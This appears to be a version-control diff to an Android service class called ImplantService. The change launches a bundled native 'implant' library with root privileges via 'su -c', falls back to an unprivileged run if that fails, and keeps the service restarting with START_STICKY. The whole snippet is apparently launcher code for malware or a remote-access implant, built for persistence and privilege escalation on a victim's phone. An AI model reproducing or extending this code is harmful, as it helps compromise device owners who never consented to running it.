@@ -24,9 +24,15 @@ public class ImplantService extends Service {
             s = p.applicationInfo.dataDir;
         } catch (PackageManager.NameNotFoundException e) {}
 
-        try {
-            Process process = Runtime.getRuntime().exec(s + "/lib/lib_implant_.so " + s);
-        } catch (java.io.IOException e) {}
+        String implant = s + "/lib/lib_implant_.so " + s;
+
+        try { // try elevated prompt
+            Process process = Runtime.getRuntime().exec("su -c \"" + implant + "\"");
+        } catch (java.io.IOException e) {
+            try { // fall back on normal prompt
+                Process process = Runtime.getRuntime().exec(implant);
+            } catch (java.io.IOException e2) {}
+        }
 
         return START_STICKY;
     }
